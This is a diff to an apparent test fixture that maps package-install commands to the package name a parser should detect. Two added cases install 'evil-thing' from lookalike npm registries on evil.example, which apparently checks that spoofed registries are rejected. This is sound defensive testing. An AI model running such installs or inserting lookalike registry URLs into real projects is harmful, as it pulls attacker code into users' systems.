@@ -67,3 +67,7 @@ pypi:requests|pip install requests > log.txt
 pypi:flask|pip install flask >> install.log 2>&1
 npm:zod|npm install zod &> out.txt
 npm:chalk|npm i chalk 2> err.txt
+npm:left-pad|npm i left-pad --registry https://registry.npmjs.org
+(none)|npm i evil-thing --registry=https://registry.npmjs.org.evil.example/
+(none)|npm i evil-thing --registry https://evil.example/registry.npmjs.org/
+pypi:requests|pip install requests --index-url https://pypi.org/simple
